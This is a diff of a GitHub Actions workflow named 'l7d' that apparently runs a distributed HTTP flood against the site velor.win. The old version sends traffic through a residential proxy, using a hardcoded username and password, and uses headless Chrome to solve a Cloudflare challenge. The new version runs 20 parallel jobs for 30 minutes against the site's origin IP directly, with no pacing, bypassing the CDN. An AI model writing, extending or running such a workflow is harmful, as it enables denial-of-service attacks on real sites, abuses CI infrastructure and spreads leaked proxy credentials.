@@ -2,34 +2,20 @@ name: l7d
 on:
   workflow_dispatch:
     inputs:
-      seconds: { default: '600' }
+      seconds: { default: '1800' }
+      workers: { default: '16' }
+      mode: { default: 'mixed' }
 jobs:
   r:
     strategy:
       fail-fast: false
       matrix:
-        n: [1,2,3,4,5,6,7,8,9,10]
+        n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
     runs-on: ubuntu-latest
-    timeout-minutes: 35
+    timeout-minutes: 40
     steps:
       - uses: actions/checkout@v4
-      - name: deps
+      - name: hit origin direct
         run: |
-          sudo apt-get update -qq >/dev/null 2>&1
-          sudo apt-get install -y -qq xvfb >/dev/null 2>&1
-          echo "chrome=$(command -v google-chrome || command -v chromium || echo none)"
-          npm i puppeteer-core --no-save --no-audit --no-fund 2>&1 | tail -2
-          export CHROME_PATH=$(command -v google-chrome || command -v chromium || echo /opt/google/chrome/chrome)
-          echo "CHROME_PATH=$CHROME_PATH" >> "$GITHUB_ENV"
-      - name: solve + hit
-        run: |
-          export TARGET_HOST=velor.win
-          RS=$(head -c8 /dev/urandom | base64 | tr -dc 'a-z0-9' | head -c8)
-          export PROXY_HP=residential.ghostconnect.io:1080 PROXY_USER=KhkYBZrKwx0cv2nt
-          export PROXY_PASS="0WmmR2nEffMQREpT_country-US_lifetime-45_fastmode-true_session-$RS"
-          export SOLVE_PROXY="http://$PROXY_HP" SOLVE_PROXY_USER="$PROXY_USER" SOLVE_PROXY_PASS="$PROXY_PASS"
-          echo "exit=$(curl -s -m 25 -x http://$PROXY_USER:$PROXY_PASS@$PROXY_HP https://api.ipify.org || echo fail)"
-          for a in 1 2 3; do [ -s cf_cookie.txt ] && break; timeout 210 xvfb-run -a node solve.js || true; sleep 2; done
-          echo "cookie=$(wc -c < cf_cookie.txt 2>/dev/null || echo 0)"
-          [ -s cf_cookie.txt ] || { echo NOCOOKIE; exit 0; }
-          TARGET_HOST=velor.win PACE_MS=0 PROXY_HP=$PROXY_HP PROXY_USER=$PROXY_USER PROXY_PASS=$PROXY_PASS node ubgjp.js mixed 20 ${{ inputs.seconds }}
+          echo "egress=$(curl -s -m 10 https://api.ipify.org || echo fail) dns=$(getent hosts velor.win | head -1)"
+          TARGET_HOST=velor.win TARGET_IP=57.131.163.31 ORIGIN_DIRECT=1 PACE_MS=0 node ubgjp.js "${{ inputs.mode }}" "${{ inputs.workers }}" "${{ inputs.seconds }}"
